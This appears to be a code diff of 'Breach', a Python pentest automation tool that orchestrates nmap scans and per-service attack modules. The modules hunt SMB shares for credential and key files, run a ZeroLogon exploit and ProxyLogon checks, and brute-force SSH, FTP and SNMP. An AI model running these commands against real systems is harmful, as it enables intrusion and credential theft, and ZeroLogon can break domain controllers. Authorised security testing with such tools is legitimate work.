@@ -1,16 +1,250 @@
-#!/usr/bin/env python3.9
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import os, time, re, argparse, signal, sys, threading, traceback, requests
-import libtmux
-import datetime
-from libnmap.parser import NmapParser
-from subprocess import Popen, run, check_output, DEVNULL, PIPE, STDOUT, TimeoutExpired
-from types import SimpleNamespace
+import argparse, datetime, os, random, re, socket, sys, threading, time, traceback
+from getpass import getpass
 from random import randrange
+from libnmap.parser import NmapParser
+from subprocess import Popen, run, check_output, DEVNULL, PIPE, STDOUT, TimeoutExpired, call
+from types import SimpleNamespace
+from urllib.parse import urlparse
+import webbrowser
+import glob
+import psutil
+import ipaddress
+import ssl
 
-os.system("clear")
-print("""
+from bs4 import BeautifulSoup
+from seleniumrequests import Chrome
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+
+from tqdm import tqdm
+
+import libtmux
+import pyperclip
+
+import webbrowser
+import requests, hashlib
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from ipaddress import ip_address
+
+from http.cookies import SimpleCookie
+
+# ! ################################################################## CORE
+
+class Breach:
+  ''' Stores Global Variables '''
+  basedir = os.getcwd()
+  skip_counter = 0
+  sudo = False            # tdo: encrypt sudo pw with random session key (still unsafe, but makes it harder)
+  single_target = False   # single target mode for modules using cidr
+  sort = False            # markdown files to be sorted after full module execution (accepts * as wildcard)
+  post = []               # commands to be executed after full module execution (dups are removed at the end)
+  switch = False          # global switch to be used inside modules (gvm-scans, >5 target osint etc.)
+  driver = False          # global selenium webdriver
+  threadpool = 0          # if module is using threads and not run_cmd they must increase block while running
+  orig_target = ""        # stores the original target format (e.g. 127.0.0.1/24,8.8.8.8)
+  ttywidth = int(check_output("tput cols", shell="/bin/bash").decode("UTF-8").strip())
+  green = '\033[92m'                  # GREEN
+  cyan = '\033[96m'                   # CYAN
+  red = '\033[91m'                    # RED
+  blue = '\033[94m'                   # BLUE
+  purple = '\033[95m'                 # PURPLE
+  underline = '\033[4m'               # UNDERLINE
+  endc = '\033[0m'                    # ENDCOLOR
+
+def parse_breachargs(module):
+  args = argparse.ArgumentParser()
+  args.add_argument('module', action='store', default=False, help='the module to use.')
+  args.add_argument('targets', action='store', default=False, help='the target(s)')
+  Breach.module = module
+  if module == "checkdeps":
+    check_deps()
+  elif module == "view":
+    os.system("tmux -L b_$(ip netns identify | sed 's@^$@DEF@') attach")
+    sys.exit()
+    # TDO: sudo tmux -L $(ip netns identify | sed 's@^$@DEF@') attach
+  elif module == "ip":
+    init_sudo()
+    run_quick_cmd("sudo -S nmap -oX - -sS --top-ports 1000 2>/dev/null | grep scaninfo | cut -d'\"' -f8 > /tmp/tcp_top1000")
+    run_quick_cmd("sudo -S nmap -oX - -sU --top-ports 100 2>/dev/null | grep scaninfo | cut -d'\"' -f8 > /tmp/udp_top100")
+    args.description = "Breach IP: Scan ports on target(s). Target = IP, Comma Sep IP, CIDR, File"
+    args.add_argument('-top',                       action='store_true', default=False, help='only scan top 1000 TCP ports and dont scan UDP')
+    args.add_argument('-ctf',                       action='store_true', default=False, help='only run cmds relevant in CTF and speed up scans')
+    # args.add_argument('-noudp',                     action='store_true', default=False, help='skip udp port scan')
+    args.add_argument('-e', '--extract',            action='store_true', default=False, help='only extract new services from XML files')
+    args.add_argument('-g', '--group',              action='store_true', default=False, help='group contents of ip.md (find similar hosts)')
+    args.add_argument('-s', '--scanner',            action='store_true', default=False, help='also start gvm/nessus scans (WIP)')
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do ip osint')
+  elif module == "domain":
+    args.description = "breach domain"
+    args.add_argument('-i', '--ip_lookup',          action='store_true', default=False, help='find ips and append to ip_scope.ip')
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do domain osint')
+  elif module == "net":
+    Breach.single_target = True
+    args.description = "breach network"
+    args.add_argument('-q', '--quick',              action='store_true', default=False, help='quick alive scan with hostnames')
+    args.add_argument('-i', '--iponly',             action='store_true', default=False, help='quick alive scan without hostnames')
+    args.add_argument('-d', '--deepscan',           action='store_true', default=False, help='deep alive scan')
+    args.add_argument('-s', '--service',            action='store',      default=False, help='find services in network (name or all)')
+    args.add_argument('-sp', '--split',             action='store_true', default=False, help='split target file to target size (default: 500)')
+    args.add_argument('-c', '--convert',            action='store_true', default=False, help='convert target to ip list (output: ip_alive.ip)')
+    args.add_argument('-n', '--namescan',           action='store_true', default=False, help='scan target for avilable hostnames (check /etc/resolv.conf)')
+  elif module == "app":
+    args.description = "breach app <SEARCH_TERM> <SEARCH_TERM> -v <EXCLUDED> <EXCLUDED>"
+    args.add_argument('searchterm',                 action='store', nargs='*', help='Search Terms')
+    args.add_argument('-v', '--reverse',            action='store', default=False, nargs='*', help='excluded terms')
+    args.add_argument('-e', '--extended',           action='store_true', default=False)
+  elif module == "unknown":
+    args.description = "breach unknown application: set port with IP:PORT (port is required!)"
+  elif module == "hash":
+    args.description = "breach hash: quick method (use bcrack for real cracking)"
+    args.add_argument('-i', '--identify',           action='store_true', default=False, help='identify given hash (default when no mode given)')
+    args.add_argument('-e', '--extended',           action='store_true', default=False, help='extended hash search')
+    args.add_argument('-m', '--mode',               action='store',      default=False, help='start cracking with given hash mode (hashcat)')
+  elif module == "http":
+    args.description = "breach http: target format = http(s)://example.com | no param = burp,basic and crawl"
+    args.add_argument('-r', '--read',               action='store_true', default=False, help='parse http.ip (net/ip module) > create http.url')
+    args.add_argument('-c', '--clean',              action='store_true', default=False, help='clean up http.url (remove duplicates and 403s)')
+    args.add_argument('-b', '--burp',               action='store_true', default=False, help='import urls in burp')
+    args.add_argument('-ff', '--firefox',           action='store_true', default=False, help='open urls in firefox')
+    args.add_argument('-basic',                     action='store_true', default=False, help='do basic checks')
+    args.add_argument('-crawl',                     action='store_true', default=False, help='busting and extended checks')
+    args.add_argument('-scan',                      action='store_true', default=False, help='run scancrawler (sqlmap, commix etc.)')
+    args.add_argument('-slow',                      action='store_true', default=False, help='slow httptest')
+    args.add_argument('-bo3',                       action='store_true', default=False, help='run bo3 on all targets')
+    args.add_argument('-lan',                       action='store_true', default=False, help='do basic and server checks (lan pentest)')
+    args.add_argument('-all',                       action='store_true', default=False, help='= basic crawl scan')
+    args.add_argument('-o','--osint',               action='store_true', default=False, help='do osint check')
+    # other
+    args.add_argument('-H', '--header',             action='append', default=[], help='set header if applicable (e.g. -H "Cookie: cookie1=value;cookie2=value2")')
+    args.add_argument('-p', '--proxy',              action='store',  default=False, help='set proxy (e.g. socks5:..) | proxychains must be setup aswell')
+    args.add_argument('-ua', '--user-agent',        action='store',  default=False, help='set user agent (default = mozilla)')
+  elif module == "smb":
+    args.description = "breach smb: set port with IP:PORT (if omitted 445 is used)"
+    args.add_argument('-u', '--user',               action='store', default=False, help='user to use')
+    args.add_argument('-p', '--password',           action='store', default=False, help='password to use')
+    args.add_argument('-H', '--hash',               action='store', default=False, help='hash to use (Format: "XYZ:<HASH>")')
+    args.add_argument('-ns', '--nospider',          action='store', default=False, help='dont spider shares (manspider)')
+    args.add_argument('-rd', '--rootdomain',        action='store', default=False, help='target root domain (e.g. audatis.de)') 
+    args.add_argument('--poison',                   action='store', default=False, help='poison target share (WIP)')
+  elif module == "ftp":
+    args.description = "breach ftp: set port with IP:PORT (if omitted 21 is used)"
+    args.add_argument('-u', '--user',               action='store', default=None, help='user to use')
+    args.add_argument('-p', '--password',           action='store', default=None, help='password to use')
+    args.add_argument('-b', '--brute',              action='store_true', default=False, help='also brute force target')    
+  elif module == "ssh":
+    args.description = "breach ssh: set port with IP:PORT (if omitted 22 is used)"
+    args.add_argument('-b', '--brute',              action='store_true', default=False, help='also brute force common passwords')
+  elif module == "smtp":
+    args.description = "breach smtp: set port with IP:PORT (if omitted 25 is used)"
+  elif module == "ns":
+    args.description = "breach ns (nameserver): set port with IP:PORT (if omitted 53 is used)"
+    args.add_argument('-rd', '--rootdomain',        action='store', default=False, help='rootdomain to use for enum')
+  elif module == "krb":
+    args.description = "breach krb (kerberos): set port with IP:PORT (if omitted 88 is used)"
+    args.add_argument('-rd', '--rootdomain',        action='store', required=True, help='root domain to use (e.g. audatis.de)(use smb before krb!)')
+    args.add_argument('-dcna', '--dcname',          action='store', default=False, help='dc name (only use this with single target)')
+    args.add_argument('-u', '--user',               action='store', default=None, help='user to use')
+    args.add_argument('-p', '--password',           action='store', default=None, help='password to use')
+    args.add_argument('-H', '--hashes',             action='store', default=None, help='hash to use')
+    args.add_argument('-b', '--brute',              action='store_true', default=False, help='also brute force target') 
+  elif module == "ldap":
+    run_quick_cmd("mkdir -p ldap")
+    args.description = "breach ldap: set port with IP:PORT (if omitted 389 is used)"
+    args.add_argument('-rd', '--rootdomain',        action='store', required=True, help='root domain to use (e.g. audatis.de)(use smb before krb!)')
+    args.add_argument('-dcna', '--dcname',          action='store', default=False, help='dc name (only use this with single target)')
+    args.add_argument('-u', '--user',               action='store', default=None, help='user to use')
+    args.add_argument('-p', '--password',           action='store', default=None, help='password to use')
+    args.add_argument('-H', '--hashes',             action='store', default=None, help='hash to use')
+  elif module == "nfs":
+    args.description = "breach nfs: set port with IP:PORT (if omitted 2049 is used)"
+  elif module == "snmp":
+    init_sudo() # sudo required for -sU nmap
+    args.description = "breach snmp: set port with IP:PORT (if omitted 161 is used)"
+    args.add_argument('-c', '--community',          action='store', default=False, help='community string to use (of omitted it will be brute forced)')
+  elif module == "vpn":
+    init_sudo()
+    args.description = "breach vpn: set port with IP:PORT (if omitted 500 is used)"
+  elif module == "mysql":
+    args.description = "breach mysql: set port with IP:PORT (if omitted 3306 is used)"
+  elif module == "rdp":
+    args.description = "breach rdp: set port with IP:PORT (if omitted 3389 is used)"
+  elif module == "sip":
+    args.description = "breach sip: set port with IP:PORT (if omitted 5060 is used)"
+  elif module == "printer":
+    args.description = "breach printer: target format = IP[:PORT]"
+    args.add_argument('-c', '--community',          action='store', default="public", help='community string to use. format: <STRING>:<VERSION> (e.g. public:2c)')
+  elif module == "email":
+    args.description = "breach email"
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do email osint')
+  elif module == "company":
+    args.description = "breach company"
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do company osint')
+  elif module == "tel":
+    args.description = "breach telephone number"
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do tel osint')
+  elif module == "site":
+    args.description = "breach site / address"
+    args.add_argument('-o', '--osint',              action='store_true', default=False, help='do site osint')
+  else:
+    modules = [
+      "checkdeps",
+      "view",
+      "ip",
+      "domain",
+      "net",
+      "app",
+      "unknown",
+      "hash",
+      "http",
+      "smb",
+      "ftp",
+      "ssh",
+      "smtp",
+      "ns",
+      "dns",
+      "krb",
+      "ldap",
+      "nfs",
+      "snmp",
+      "vpn",
+      "mysql",
+      "rdp",
+      "sip",
+      "printer",
+      "email",
+    ]
+    print(Breach.red + "Unknown module. Available modules:" + Breach.endc)
+    for module in modules:
+      print(module)
+    sys.exit(1)
+
+  # Global Arguments
+  args.add_argument('--------------------------------------------------------------------.',  help='')
+  args.add_argument('-w', '--watch',             action='store', default=None, help='process to watch (stop on not found)')
+  args.add_argument('-cc', '--concurr_cmds',     action='store', default=2, help='number of cmds to run concurrently')
+  args.add_argument('-op', '--osint_proxy',      action='store', default=False, help='use this proxy for osint (format: http://127.0.0.1:24000) | proxychains must be setup aswell!')
+  args.add_argument('-hf', '--headful',          action='store_true', default=False, help='dont run driver in headless mode (default: false)')
+  args.add_argument('--noresume',                action='store_true', default=False, help='ignore state')
+  args.add_argument('--nofile',                  action='store_true', default=False, help='output to tty only')
+  args.add_argument('--notty',                   action='store_true', default=False, help='dont write cmd output to tty')
+  args.add_argument('--quiet',                   action='store_true', default=None, help='dont print banner')
+  args = args.parse_args()
+  if hasattr(args, 'osint') and args.osint:
+    print("OSINT selected. Make sure your browser is logged into:")
+    print("https://www.shodan.io/dashboard")
+    print("https://www.zoomeye.org/login")
+    print("https://community.riskiq.com/login")
+    time.sleep(1)
+  for arg in vars(args):
+    setattr(Breach, arg, getattr(args, arg))
+
+def print_banner():
+  os.system("clear")
+  print("""
                     .:odxxddl:,.
                   'lxOkol::;;,,,'.
                ,xXWKOkOKXXXX0xl;.
@@ -34,536 +268,2435 @@ print("""
                 
 """)
 
-# TODO
-# Stop breach when VPN disconnect is detected (tun1 down = exit()) > DONE file maybe?
-
-class Breach:
-  '''
-  Breach stores global parameters
-  Each target / host is a breach instance
-  '''
-  # Fixed
-  serv = libtmux.Server(socket_name="breach_socket")
-  cmdwatch = []
-  tmux = None
-  curtar = 0
-  colors = {
-    'GREEN': '\033[92m',
-    'CYAN': '\033[96m',
-    'GRAY': '\033[97m',
-    'ENDC': '\033[0m',
-    'RED': '\033[91m',
-    'BLUE': '\033[94m',
-    'HEADER': '\033[95m',
-    'FAIL': '\033[91m',
-    'BOLD': '\033[1m',
-    'ULINE': '\033[4m',
-  }
-  # Variable
-  customport = False
-  usr = None
-  password = None
-  gui = False
-  ttyout = True
-  concurr_targets = 3
-  concurr_cmds = 3
-
-  def __init__(self, target, tardir=None, svc=None, port=None, udp=False):
-    self.target = target
-    # Subnmap args
-    self.port = port
-    self.dir = tardir
-    self.svc = svc
-    self.udp = udp
-
-  def init_cmdwatch():
-    while True:
-      if not len(Breach.cmdwatch) > 0:
-        time.sleep(1)
-      else:
-        for i, running_cmd in enumerate(Breach.cmdwatch):
-          if len(running_cmd.pane.cmd('capture-pane', '-p').stdout) > 0:
-            curtim = int(time.time() - running_cmd.start_time)
-            curout = running_cmd.pane.cmd('capture-pane', '-p').stdout[-1]
-            shortcmd = running_cmd.cmd.split(" ")[0]
-            screen = F"{Breach.colors.BLUE}>>>{Breach.colors.ENDC} {i+1}/{len(Breach.cmdwatch)}  {running_cmd.target}  T:{curtim}  C:{shortcmd} O:{curout}" + " "*Breach.ttywidth
-            print("\r" + screen[:Breach.ttywidth], end='')
-            time.sleep(1)
-            running_cmd.isdone = curout == "BREACHEND"
-            running_cmd.istimeout = curtim > running_cmd.tout
-          if running_cmd.isdone or running_cmd.istimeout:
-            if running_cmd.istimeout:
-              print("\rTimeout on " + running_cmd.target + " " + running_cmd.cmd[:70])
-              running_cmd.isdone = True
-            if running_cmd.outfil != "":
-              if running_cmd.istimeout:
-                cout = running_cmd.pane.cmd('capture-pane', '-p', '-S', '-').stdout
-              else:
-                cout = running_cmd.pane.cmd('capture-pane', '-p', '-S', '-').stdout[:-1]
-              cout = '\n'.join(cout)
-              filtered = False
-              if running_cmd.filt:
-                if type(running_cmd.filt) == str:
-                  running_cmd.filt = [running_cmd.filt]
-                for filtr in running_cmd.filt:
-                  if filtr in cout or cout.strip() == "":
-                    filtered = True
-              if not filtered:
-                # if os.path.exists(F"{running_cmd.dir}/{str(running_cmd.port)}_{running_cmd.outfil}"):
-                  with open(F"{running_cmd.dir}/{str(running_cmd.port)}_{running_cmd.outfil}", "a") as fil:
-                    date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-                    fil.write(F"{date}:{running_cmd.cmd}\n")
-                    fil.write(cout + "\n\n\n")
-                # else:
-                #   with open(F"{running_cmd.dir}/{str(running_cmd.port)}_{running_cmd.outfil}", "w") as fil:
-                #     fil.write(cout)
-              elif filtered:
-                Breach.filtrlog.write(F"{running_cmd.cmd}\n{cout}")
-              if Breach.ttyout and not filtered:
-                print("\r" + " "*Breach.ttywidth, end=' ')
-                print("\n"+ Breach.colors.GREEN + "### " + running_cmd.cmd[:Breach.ttywidth] + ":" + Breach.colors.ENDC)
-                print(cout + "\n")
-            Breach.cmdwatch.remove(running_cmd)
-            running_cmd.pane.cmd('kill-pane')
-
-  def init_connwatch():
-    ''' This is used to monitor active network connections '''
-    while True:
-      result = run(F"ping -c 1 {Breach.connwatch}",shell=True, stdout=DEVNULL, stderr=DEVNULL)
-      if result.returncode != 0:
-        date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        screen = F"{Breach.colors.RED}Connection Watch ERROR on: " + date + " "*Breach.ttywidth
-        print("\r" + screen[:Breach.ttywidth], end='')
-        while len(Breach.cmdwatch) > 0:
-          for running_cmd in Breach.cmdwatch:
-            running_cmd.pane.cmd('kill-pane')
-            Breach.cmdwatch.remove(running_cmd)
-        os.kill(os.getpid(), signal.SIGUSR1)
-      else:
-        time.sleep(2)
-
-  def parse_breachargs():
-    args = Breach.parser.parse_args()
-    for arg in vars(args):
-      setattr(Breach, arg, getattr(args, arg))
-    # Parse Target Info
-    if re.compile(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}\/\d\d$').findall(Breach.targets):
-      print("Target is CIDR Range... converting to file")
-      os.system("nmap -sL -n "+ Breach.targets +" | awk '/Nmap scan report/{print $NF}' > ip_alive.txt")
-      Breach.targets = "ip_alive.txt"
-    if os.path.isfile(Breach.targets):
-      print("Target is file... reading")
-      Breach.targets = Breach.parse_file(Breach.targets)
-    elif ',' in Breach.targets:
-      print("Target is comma separated list...")
-      Breach.targets = Breach.targets.split(",")
+def parse_targets():
+  def is_cidr(target):
+    if re.compile(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}\/\d\d$').findall(target):
+      return True
     else:
-      Breach.targets = [Breach.targets]
-    Breach.targets_len = len(Breach.targets)
-    if Breach.targets_len > 1:
-      print("Breaching " + str(Breach.targets_len) + " Targets!\n")
-
-  def parse_file(target):
-    targets = []
-    with open(target, "r") as fil:
-      for lin in fil.readlines():
-        targets.append(lin.strip())
-    return targets
-
-  def run_cmd(self, cmd, outfil, filt=False, bg=False, wait=False, tout=900):
-    running_cmd = {
-      "target": self.target,
-      "port": self.port,
-      "dir": self.dir,
-      "cmd": cmd,
-      "outfil": outfil,
-      "filt": filt,
-      "bg": bg,
-      "tout": tout,
-      "istimeout": False,
-      "isdone": False,
-    }
-    running_cmd = SimpleNamespace(**running_cmd)
-    if outfil == "":
-      winnam = running_cmd.target + "_" + cmd.split(" ")[0]
-    else:
-      winnam = running_cmd.target + "_" + outfil
-
-    while len(Breach.cmdwatch) >= Breach.concurr_cmds:
-      time.sleep(randrange(2))
-
-    running_cmd.pane = Breach.tmux.new_window(winnam).attached_pane
-    running_cmd.start_time = time.time()
-    if bg:
-      running_cmd.pane.send_keys(F"{cmd}; exit || exit")
-    else:
-      running_cmd.pane.send_keys(F"{cmd}; echo;echo BREACHEND")
-      Breach.cmdwatch.append(running_cmd)
-    return running_cmd
-
-  def breach_http(b):
-    # PORT (if target is URL)
-    if not b.port:
-      if re.compile(r':\d+').findall(b.target):
-        b.port = re.compile(r':\d+').findall(b.target)[0].split(":")[1]
-      if 'https' in b.target:
-        b.port = 443
-      else:
-        b.port = 80
-    # SCHEME
-    if 'http' in b.target: # targetis URL
-      url = b.target
-    elif b.ssl: # coming from breach_ip
-      url = F"https://{b.target}:{b.port}"
-    else:
-      url = F"http://{b.target}:{b.port}"
-
-    if b.password:
-      pass
-    else:
-      if b.gui:
-        b.run_cmd(F"firefox {url}", bg=True)
-        b.run_cmd(F"curl -f -k -x http://127.0.0.1:8080 {url}", "burpcurl.txt", tout=5)
-      b.run_cmd(F'curl -f -k -sSL -D - {url} -o /dev/null | grep -v "Accept-Encoding\|Connection: close\|Date:\|Content-Type"', "curl.txt", tout=5)
-      b.run_cmd(F"curl -f -k {url}/robots.txt", "curl.txt", filt="returned error", tout=10)
-      b.run_cmd(F"curl -f -k {url}/security.txt", "curl.txt", filt="returned error", tout=10)
-      b.run_cmd(F"curl -f -k {url}/sitemap.xml", "curl.txt", filt="returned error", tout=10)
-      # WAF Check
-      b.run_cmd(F"wafw00f -a -vv {url}", "waf.txt", filt="Found: 0 matches", tout=60)
-      # Header Check
-      b.run_cmd(F"shcheck.py -d {url} | grep 'Frame\|Content-Type\|Content-Security\|Strict-Transport' | grep Missing", "sec_header.txt")
-      # Weak TLS
-      b.run_cmd(F"sslscan --no-ciphersuites --no-heartbleed {url} | grep -e 'TLSv1.[01].*enabled'", "tls_weak.txt", filt="Invalid target specified")
-      # FFUF
-      b.run_cmd(F"echo ffuf_600_sec;ffuf -r -w $wl/file_web.txt -u {url}/FUZZ -maxtime 600 2>/dev/null | tee /dev/stdout | sort -k 4 -n", "ffuf.txt")
-
-  def run_module(b):
-    if "http" in b.svc and not "ncacn" in b.svc:
-      Breach.breach_http(b)
-
-    elif "smb" in b.svc or "microsoft-ds" in b.svc or "samba" in b.svc:
-      b.run_cmd(F"enum4linux -A {b.target}", "enum4linux.txt")
-      b.run_cmd(F"enum4linux -A {b.target} -u Guest -p ''", "enum4linux.txt")
-      b.run_cmd(F"cme smb {b.target} --port {b.port} --shares", "cme.txt")
-      b.run_cmd(F"cme smb {b.target} --port {b.port} -u Guest -p '' --shares", "cme.txt", filt="STATUS_LOGON_FAILURE")
-      b.run_cmd(F'sudo nmap -p {b.port} --script "smb*" {b.target} --script-timeout 15m', "nmap_smb.txt")
-      b.run_cmd(F'nmap -p {b.port} --script-args=unsafe=1 --script smb-os-discovery {b.target}', "nmap_os.txt")
-      b.run_cmd(F"impacket-rpcdump '@{b.target}' | grep MS-RPRN", "printnight.txt")
-      b.run_cmd(F'manspider {b.target} -u Guest -p empty -f passw user kennw mitarbeiter geheim vertraulich netzwerk zugang admin account network login logon cred sql', "manspider.txt")
-      b.run_cmd(F'manspider {b.target} -u Guest -p empty -c passw kennw geheim vertraulich', "manspider.txt")
-      b.run_cmd(F'manspider {b.target} -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config', "manspider.txt")
-      b.run_cmd(F'manspider {b.target} -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der', "manspider.txt")
-      
-    elif "ftp" in b.svc:
-      if b.password: # authed breach
-        b.run_cmd(F"curl ftp://{b.usr}:{b.password}@{b.target}","authed_ftp_curl.txt")
-      else:
-        if b.gui:
-          b.run_cmd(F"filezilla ftp://anonymous:anonymous@{b.target}","")
-        b.run_cmd(F"curl ftp://{b.target}:{b.port}", "curl_ftp.txt")
-        b.run_cmd(F"nmap -Pn -sV -p{b.port} {b.target} --script 'ftp*' --script-timeout 10m", "nmap_ftp.txt", tout=900)
-        b.run_cmd(F"telnet {b.target} 21", "ftp_telnet.txt", tout=8)
-
-    elif "ssh" in b.svc:
-      b.run_cmd(F"ssh-audit -p {b.port} {b.target} | grep cve", "ssh-audit.txt")
-      b.run_cmd(F"ssh-audit -p {b.port} -l fail {b.target}", "ssh-audit.txt")
-
-    elif "smtp" in b.svc:
-      b.run_cmd(F"smtp-audit {b.target}:{b.port}", "nmap_smtp.txt")
-      b.run_cmd(F"msfconsole -qx 'use scanner/http/exchange_proxylogon;set RHOSTS {b.target};run;exit'", "proxylogon.txt")    
-
-    elif "dns" in b.svc or "domain" in b.svc:
-      b.run_cmd(F"dig version.bind CHAOS TXT @{b.target}", "dig.txt", tout=60)
-      b.run_cmd(F"dig axfr @{b.target}", "dig.txt", tout=60)
-      b.run_cmd(F'nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" {b.target} -p {b.port}', "nmap_dns.txt")
-      b.run_cmd(F'dnsrecon -r 127.0.0.1/24 -n {b.target}', "dnsrecon.txt", tout=60)
-
-    elif "kerberos" in b.svc:
-      b.run_cmd(F"cme smb {b.target} -u '' -p '' -M zerologon", "zerologon.txt")
-      b.run_cmd(F"$pl/windows/ad/exploits/ZeroLogon-cve-2020-1472.py -t {b.target}", "zerologon.txt")
-      b.run_cmd(F"msfconsole -qx 'use scanner/http/exchange_proxylogon;set RHOSTS {b.target};run;exit'", "proxylogon.txt")
-    
-    elif "ldap" in b.svc:
-      b.run_cmd(F"ldapsearch-ad -l {b.target} -t info", "ldapsearch.txt")
-      b.run_cmd(F"ldapsearch -x -H ldap://{b.target}:{b.port} -x -s base namingcontexts", "ldapsearch.txt")
-      b.run_cmd(F"mkdir -p ADE-SCAN && echo ade '$RDOM' --no-creds --all -o ./ADE-SCAN/ade", "ade-scan_anon.txt")
-      b.run_cmd(F"echo impacket-GetADUsers -all '$RDOM/$USR' -dc-ip $DCIP -no-pass", "imp_getadusers.txt")
-      b.run_cmd(F"echo 'bloodhound-python -c ALL -u $USR -p $PW -d $RDOM -dc $DCNA.$RDOM -ns $DCIP'", "bloodhound.txt")
-      b.run_cmd(F"enum4linux -A {b.target}", "enum4linux.txt")
-      b.run_cmd(F"enum4linux -A {b.target} -u Guest -p ''", "enum4linux.txt")
-
-    elif "nfs" in b.svc:
-      b.run_cmd(F"nmap -sV -p {b.port} --script='rpc*' {b.target}", "nmap_nfs.txt")
-      b.run_cmd(F"showmount -e {b.target}", "showmount.txt")
-
-    elif "snmp" in b.svc:
-      b.run_cmd(F"sudo nmap -sU -sV -sC --open -p {b.port} {b.target}", "nmap_snmp.txt")
-      b.run_cmd(F"onesixtyone {b.target}", "onesixtyone.txt")
-    
-    elif "vpn" in b.svc:
-      b.run_cmd(F"nmap -sU -p {b.port} {b.target}", "nmap_vpn.txt")
-      b.run_cmd(F"ike-scan -M {b.target}", "ike-scan.txt")
-    
-    elif "mysql" in b.svc:
-      b.run_cmd(F"nmap -sV -p {b.port} --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {b.target}", "nmap_mysql.txt")
-    
-    elif "rdp" in b.svc:
-      b.run_cmd(F'nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p {b.port} {b.target}', "nmap_rdp.txt")
-
-    elif "sip" in b.svc:
-      b.run_cmd(F"sipscan -h {b.target}", "sipscan.txt")
-      b.run_cmd(F"sipexten -h {b.target}", "sipexten.txt")
-      b.run_cmd(F"sipcracker -h {b.target}", "sipcracker.txt")
-      b.run_cmd(F"sipinvite -h {b.target}", "sipinvite.txt")
-      b.run_cmd(F"sipdigestleak -h {b.target}", "sipdigestleak.txt")
-    
-    elif "printer" in b.svc or "ipp" in b.svc:
-      b.run_cmd(F"echo Printer detected > run pret", "pret.txt")
-    
-    elif "unknown" in b.svc or "" == b.svc:
-      pass # amass ?
-
-    else:
-      print("   No module found for: " + b.svc)
-      with open(b.dir+"/unscanned_svcs.txt", "a") as fil:
-        fil.write(b.svc + "\t" + str(b.port) + "\t\t" + b.target + "\n")
       return False
 
-  def run_nmap(b):
-    if re.compile(r'((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$').findall(os.getcwd()):
-      if len(b.targets) > 1 and b.target not in os.getcwd():
-        print("You are already inside a target dir and specified target != current dir... aborting nmap scan")
-        os.kill(os.getpid(), signal.SIGUSR1)
-        exit(1)
-
-    if os.path.exists(F"{b.dir}/DONE"):
-      print(F"DONE file found for {b.target}. Skipping...")
-      return
-
-    Breach = b.__class__
-    Breach.curtar += 1
-    print(F"\r{b.colors.GREEN}+++ Breaching   {str(b.curtar)} / {b.targets_len}   {b.target}{b.colors.ENDC}" + " "*(b.ttywidth-40))
-    b.dir = b.basedir + "/d_" + b.target
-    # Setup
-    os.system(F"mkdir -p {b.dir}")
-    b.port = "host" # Fake Port for log
-    b.run_cmd(F"dig +short -x {b.target}", "dig.txt") # Warning = no good filter
-    b.run_cmd(F'ping -c 1 {b.target}', "ping.txt")
-
-    # Scan
-    b.port = "nmap" # fake port for log
-    tcp_scan = udp_scan = SimpleNamespace()
-    if os.path.exists(F"{b.dir}/nmap_tcp.xml"):
-      try:
-        NmapParser.parse_fromfile(F'{b.dir}/nmap_tcp.xml').hosts[0].services
-        tcp_scan.isdone = True
-      except:
-        print(F'\r{b.dir}/nmap_tcp.xml is broken.. deleting'+" "*(b.ttywidth-20))
-        os.remove(F'{b.dir}/nmap_tcp.xml')
-    if os.path.exists(F"{b.dir}/nmap_udp.xml"):
-      try:
-        NmapParser.parse_fromfile(F'{b.dir}/nmap_udp.xml').hosts[0].services
-        udp_scan.isdone = True
-      except:
-        print(F'\r{b.dir}/nmap_udp.xml is broken.. deleting'+" "*(b.ttywidth-20))
-        os.remove(F'{b.dir}/nmap_udp.xml')
-
-    if os.path.exists(F"{b.dir}/nmap_tcp.xml"):
-      print(F"{b.target}/nmap_tcp.xml exists.. skipping tcp scan")
+  Breach.orig_target = Breach.targets
+  Breach.targetfile = "/tmp/breach_" + str(random.randint(0,9999)) + ".txt"
+  if ',' in Breach.targets:
+    # print("Target is comma separated list... splitting")
+    targets_array = Breach.targets.split(",")
+    if any(is_cidr(item) for item in targets_array):
+      for target in targets_array:
+        os.system("nmap -sL -n "+ target +" | awk '/Nmap scan report/{print $NF}' >> " + Breach.targetfile)
+        # print("Created target file: " + Breach.targetfile)
+        Breach.targets = parse_file(Breach.targetfile)
     else:
-      print((F"\r{b.colors.CYAN}--- TCP Scanning: {b.target} {b.colors.ENDC}"+" "*b.ttywidth)[:b.ttywidth+1])
-      if Breach.ctf:
-        tcp_scan = b.run_cmd(F"nmap -sS -sV -oX {b.dir}/nmap_tcp.xml -Pn -vv -p- {b.target} --min-rate 5000 --script-timeout 10m", "tcp.txt", tout=9000)
-      else:
-        tcp_scan = b.run_cmd(F"nmap -sS -sV -oX {b.dir}/nmap_tcp.xml -Pn -vv -p- {b.target} -T3 --script-timeout 10m", "tcp.txt", tout=9000)
+      Breach.targets = Breach.targets.split(",")
+  elif re.compile(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}\/\d{1,2}$').findall(Breach.targets):
+    os.system("nmap -sL -n "+ Breach.targets +" | awk '/Nmap scan report/{print $NF}' > " + Breach.targetfile)
+    # print("Target is CIDR Range... converting to file:" + Breach.targetfile)
+    Breach.targets = parse_file(Breach.targetfile)
